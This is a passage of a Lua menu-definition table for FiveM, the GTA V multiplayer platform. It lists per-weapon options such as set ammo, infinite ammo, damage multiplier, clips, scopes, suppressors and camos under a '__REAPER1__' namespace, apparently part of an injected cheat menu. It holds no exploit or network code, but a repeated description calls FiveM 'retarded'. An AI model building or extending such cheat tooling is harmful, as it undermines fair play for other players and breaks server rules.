            {text = 'Set ammo in clip', dkey = 'weapon:ceramicpistol_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:ceramicpistol_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:ceramicpistol_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:ceramicpistol_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_CERAMICPISTOL_CLIP_01`},
            {text = 'Extended clip', dkey = 'weapon:ceramicpistol_extendedclip', desc = 'Enable the extended clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_CERAMICPISTOL_CLIP_02`},
            {text = 'Suppressor', dkey = 'weapon:ceramicpistol_suppressor', desc = 'Enable the suppressor.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_CERAMICPISTOL_SUPP`},
        },
        
        ['weapon:microsmg'] = {
            {text = 'Set ammo', dkey = 'weapon:microsmg_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:microsmg_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:microsmg_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:microsmg_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:microsmg_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:microsmg_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_MICROSMG_CLIP_01`},
            {text = 'Extended clip', dkey = 'weapon:microsmg_extendedclip', desc = 'Enable the extended clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_MICROSMG_CLIP_02`},
            {text = 'Flashlight', dkey = 'weapon:microsmg_flashlight', desc = 'Enable the flashlight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_PI_FLSH`},
            {text = 'Scope', dkey = 'weapon:microsmg_scope', desc = 'Enable the scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SCOPE_MACRO`},
            {text = 'Suppressor', dkey = 'weapon:microsmg_suppressor', desc = 'Enable the suppressor.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_SUPP_02`},
            {text = 'Luxury variant', dkey = 'weapon:microsmg_luxuryvariant', desc = 'Enable the luxury variant.', afu = __REAPER1__.M.weapon.editor.luxuryvariant, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_MICROSMG_VARMOD_LUXE`},
        },
        
        ['weapon:smg'] = {
            {text = 'Set ammo', dkey = 'weapon:smg_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:smg_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:smg_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:smg_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:smg_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:smg_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SMG_CLIP_01`},
            {text = 'Extended clip', dkey = 'weapon:smg_extendedclip', desc = 'Enable the extended clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SMG_CLIP_02`},
            {text = 'Drum clip', dkey = 'weapon:smg_drumclip', desc = 'Enable the drum clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SMG_CLIP_03`},
            {text = 'Flashlight', dkey = 'weapon:smg_flashlight', desc = 'Enable the flashlight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_FLSH`},
            {text = 'Scope', dkey = 'weapon:smg_scope', desc = 'Enable the scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SCOPE_MACRO_02`},
            {text = 'Suppressor', dkey = 'weapon:smg_suppressor', desc = 'Enable the suppressor.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_PI_SUPP`},
            {text = 'Luxury variant', dkey = 'weapon:smg_luxuryvariant', desc = 'Enable the luxury variant.', afu = __REAPER1__.M.weapon.editor.luxuryvariant, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SMG_VARMOD_LUXE`},
        },
        
        ['weapon:assaultsmg'] = {
            {text = 'Set ammo', dkey = 'weapon:assaultsmg_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:assaultsmg_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:assaultsmg_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:assaultsmg_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:assaultsmg_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:assaultsmg_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_ASSAULTSMG_CLIP_01`},
            {text = 'Extended clip', dkey = 'weapon:assaultsmg_extendedclip', desc = 'Enable the extended clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_ASSAULTSMG_CLIP_02`},
            {text = 'Flashlight', dkey = 'weapon:assaultsmg_flashlight', desc = 'Enable the flashlight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_FLSH`},
            {text = 'Scope', dkey = 'weapon:assaultsmg_scope', desc = 'Enable the scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SCOPE_MACRO`},
            {text = 'Suppressor', dkey = 'weapon:assaultsmg_suppressor', desc = 'Enable the suppressor.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_SUPP_02`},
            {text = 'Luxury variant', dkey = 'weapon:assaultsmg_luxuryvariant', desc = 'Enable the luxury variant.', afu = __REAPER1__.M.weapon.editor.luxuryvariant, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_ASSAULTSMG_VARMOD_LOWRIDER`},
        },
        
        ['weapon:minismg'] = {
            {text = 'Set ammo', dkey = 'weapon:minismg_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:minismg_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:minismg_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:minismg_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:minismg_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:minismg_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_MINISMG_CLIP_01`},
            {text = 'Extended clip', dkey = 'weapon:minismg_extendedclip', desc = 'Enable the extended clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_MINISMG_CLIP_02`},
        },
        
        ['weapon:smg_mk2'] = {
            {text = 'Set ammo', dkey = 'weapon:smg_mk2_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:smg_mk2_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:smg_mk2_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:smg_mk2_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:smg_mk2_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:smg_mk2_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SMG_MK2_CLIP_01`},
            {text = 'Extended clip', dkey = 'weapon:smg_mk2_extendedclip', desc = 'Enable the extended clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PISTOL_MK2_CLIP_02`},
            {text = 'Tracer rounds', dkey = 'weapon:smg_mk2_tracerrounds', desc = 'Enable the tracer rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SMG_MK2_CLIP_TRACER`},
            {text = 'Incendiary rounds', dkey = 'weapon:smg_mk2_incendiaryrounds', desc = 'Enable the incendiary rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SMG_MK2_CLIP_INCENDIARY`},
            {text = 'Hollow point rounds', dkey = 'weapon:smg_mk2_hollowpointrounds', desc = 'Enable the hollow point rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SMG_MK2_CLIP_HOLLOWPOINT`},
            {text = 'Metal jacket rounds', dkey = 'weapon:smg_mk2_metaljacketrounds', desc = 'Enable the metal jacket rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SMG_MK2_CLIP_FMJ`},
            {text = 'Flashlight', dkey = 'weapon:smg_mk2_flashlight', desc = 'Enable the flashlight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_FLSH`},
            {text = 'Holographic sight', dkey = 'weapon:smg_mk2_holographicsight', desc = 'Enable the holographic sight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SIGHTS_SMG`},
            {text = 'Small scope', dkey = 'weapon:smg_mk2_smallscope', desc = 'Enable the small scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SCOPE_MACRO_02_SMG_MK2`},
            {text = 'Medium scope', dkey = 'weapon:smg_mk2_mediumscope', desc = 'Enable the medium scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SCOPE_SMALL_SMG_MK2`},
            {text = 'Suppressor', dkey = 'weapon:smg_mk2_suppressor', desc = 'Enable the suppressor.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_PI_SUPP`},
            {text = 'Flat muzzle break', dkey = 'weapon:smg_mk2_flatmuzzlebreak', desc = 'Enable the flat muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_01`},
            {text = 'Tactical muzzle break', dkey = 'weapon:smg_mk2_tacticalmuzzlebreak', desc = 'Enable the tactical muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_02`},
            {text = 'Fat-end muzzle break', dkey = 'weapon:smg_mk2_fat-endmuzzlebreak', desc = 'Enable the fat-end muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_03`},
            {text = 'Precision muzzle break', dkey = 'weapon:smg_mk2_precisionmuzzlebreak', desc = 'Enable the precision muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_04`},
            {text = 'Heavy duty muzzle break', dkey = 'weapon:smg_mk2_heavydutymuzzlebreak', desc = 'Enable the heavy duty muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_05`},
            {text = 'Slanted muzzle break', dkey = 'weapon:smg_mk2_slantedmuzzlebreak', desc = 'Enable the slanted muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_06`},
            {text = 'Split-end muzzle break', dkey = 'weapon:smg_mk2_split-endmuzzlebreak', desc = 'Enable the split-end muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_07`},
            {text = 'Default barrel', dkey = 'weapon:smg_mk2_defaultbarrel', desc = 'Enable the default barrel.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SB_BARREL_01`},
            {text = 'Heavy barrel', dkey = 'weapon:smg_mk2_heavytbarrel', desc = 'Enable the heavy barrel.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SB_BARREL_02`},
            {text = 'Digital camo', dkey = 'weapon:smg_mk2_digitalcamo', desc = 'Enable the digital camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SMG_MK2_CAMO`},
            {text = 'Bruhstroke camo', dkey = 'weapon:smg_mk2_bruhstrokecamo', desc = 'Enable the bruhstroke camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SMG_MK2_CAMO_02`},
            {text = 'Woodland camo', dkey = 'weapon:smg_mk2_woodlandcamo', desc = 'Enable the woodland camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SMG_MK2_CAMO_03`},
            {text = 'Skull camo', dkey = 'weapon:smg_mk2_skullcamo', desc = 'Enable the skull camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SMG_MK2_CAMO_04`},
            {text = 'Sessanta nove camo', dkey = 'weapon:smg_mk2_sessantanovecamo', desc = 'Enable the sessanta nove camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SMG_MK2_CAMO_05`},
            {text = 'Perseus camo', dkey = 'weapon:smg_mk2_perseuscamo', desc = 'Enable the perseus camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SMG_MK2_CAMO_06`},
            {text = 'Leopard camo', dkey = 'weapon:smg_mk2_leopardcamo', desc = 'Enable the leopard camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SMG_MK2_CAMO_07`},
            {text = 'Zebra camo', dkey = 'weapon:smg_mk2_zebracamo', desc = 'Enable the zebra camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SMG_MK2_CAMO_08`},
            {text = 'Geometric camo', dkey = 'weapon:smg_mk2_geometriccamo', desc = 'Enable the geometric camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SMG_MK2_CAMO_09`},
            {text = 'Boom camo', dkey = 'weapon:smg_mk2_boomcamo', desc = 'Enable the boom camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SMG_MK2_CAMO_10`},
            {text = 'Patriotic camo', dkey = 'weapon:smg_mk2_patrioticcamo', desc = 'Enable the patriotic camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SMG_MK2_CAMO_IND_01`},
        },
        
        ['weapon:machinepistol'] = {
            {text = 'Set ammo', dkey = 'weapon:machinepistol_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:machinepistol_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:machinepistol_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:machinepistol_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:machinepistol_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:machinepistol_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_MACHINEPISTOL_CLIP_01`},
            {text = 'Extended clip', dkey = 'weapon:machinepistol_extendedclip', desc = 'Enable the extended clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_MACHINEPISTOL_CLIP_02`},
            {text = 'Drum clip', dkey = 'weapon:machinepistol_drumclip', desc = 'Enable the drum clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_MACHINEPISTOL_CLIP_03`},
            {text = 'Suppressor', dkey = 'weapon:machinepistol_suppressor', desc = 'Enable the suppressor.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_PI_SUPP`},
        },
        
        ['weapon:combatpdw'] = {
            {text = 'Set ammo', dkey = 'weapon:combatpdw_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:combatpdw_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:combatpdw_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:combatpdw_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:combatpdw_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:combatpdw_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_COMBATPDW_CLIP_01`},
            {text = 'Extended clip', dkey = 'weapon:combatpdw_extendedclip', desc = 'Enable the extended clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_COMBATPDW_CLIP_02`},
            {text = 'Drum clip', dkey = 'weapon:combatpdw_drumclip', desc = 'Enable the drum clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_COMBATPDW_CLIP_03`},
            {text = 'Flashlight', dkey = 'weapon:combatpdw_flashlight', desc = 'Enable the flashlight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_FLSH`},
            {text = 'Grip', dkey = 'weapon:combatpdw_grip', desc = 'Enable the grip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_AFGRIP`},
            {text = 'Scope', dkey = 'weapon:combatpdw_scope', desc = 'Enable the scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SCOPE_SMALL`},
        },
        
        ['weapon:pumpshotgun'] = {
            {text = 'Set ammo', dkey = 'weapon:pumpshotgun_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:pumpshotgun_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:pumpshotgun_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:pumpshotgun_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:pumpshotgun_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Flashlight', dkey = 'weapon:pumpshotgun_flashlight', desc = 'Enable the flashlight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_FLSH`},
